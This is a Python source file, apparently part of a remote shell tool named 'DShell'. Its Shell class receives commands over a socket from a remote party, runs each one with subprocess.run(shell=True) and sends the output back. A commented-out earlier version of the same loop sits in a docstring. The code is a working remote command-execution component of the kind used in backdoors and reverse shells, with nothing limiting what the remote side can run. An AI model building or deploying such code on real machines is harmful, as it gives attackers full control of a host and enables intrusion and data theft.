#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : yyxzz
# @Software: PyCharm
# @Time    : 2020/8/17 11:03

import os
import subprocess
from lib.dsSocket import *

class Shell:
    def __init__(self, client, sendBufferSize = 4096, recvBufferSize = 8192):
        self.client = client
        self.sendBufferSize = sendBufferSize
        self.recvBufferSize = recvBufferSize
        """
    def shell(self):
        while True:
            pwd = os.getcwd()
            title = "%s > " % (pwd)
            # self.client.send(title.encode(Encode.encoding))
            DShellSend(self.client, title)
            # cmd = self.client.recv(self.recvBufferSize).decode(Encode.encoding)
            cmd = DShellRecv(self.client)
            print(cmd)
            if cmd in ["quit", "exit", "q"]:
                return 0
            try:
                if cmd[:2] == "cd":
                    os.chdir(cmd[3:])
                    # self.client.send(cmd.encode(Encode.encoding))
                    DShellSend(self.client, cmd)
                elif cmd[1] == ":":
                    os.chdir(cmd)
                    # self.client.send(cmd.encode(Encode.encoding))
                    DShellSend(self.client, cmd)
                else:
                    result = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    # 判断成功执行与否，及stdout是否为空
                    if result.returncode == 0:
                        DShellSend(self.client, result.stdout) if len(result.stdout) != 0 else DShellSend(self.client, cmd)
                    else:
                        DShellSend(self.client, result.stderr)

                    # # 判断成功执行与否，及stdout是否为空
                    # if result.returncode == 0:
                    #     DShellSend(self.client, result.stdout) if len(result.stdout) != 0 else DShellSend(self.client, cmd)
                    #     # self.client.send(result.stdout) if len(result.stdout) != 0 else self.client.send(cmd.encode(Encode.encoding))
                    # else:
                    #     # self.client.send(result.stderr)
                    #     DShellSend(self.client, result.stderr)

            except FileNotFoundError:
                # self.client.send("No Such File or Directory !".encode(Encode.encoding))
                DShellSend(self.client, "No Such File or Directory !")
            except:
                # self.client.send("An ERROR !".encode(Encode.encoding))
                DShellSend(self.client, "An ERROR !")
        """

    def shell(self):
        while True:
            pwd = os.getcwd()
            title = "%s" % (pwd)
            DShellSend(self.client, title)
            cmd = DShellRecv(self.client)
            try:
                if cmd in ["quit", "exit", "q"]:
                    return 0
                if cmd[:2] == "cd":
                    os.chdir(cmd[3:])
                    DShellSend(self.client, cmd)
                elif cmd[1] == ":":
                    os.chdir(cmd)
                    DShellSend(self.client, cmd)
                else:
                    result = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    # 判断成功执行与否，及stdout是否为空
                    if result.returncode == 0:
                        DShellSend(self.client, result.stdout) if len(result.stdout) != 0 else DShellSend(self.client, cmd.encode("gbk"))
                    else:
                        DShellSend(self.client, result.stderr)
            except:
                DShellSend(self.client, "Error")

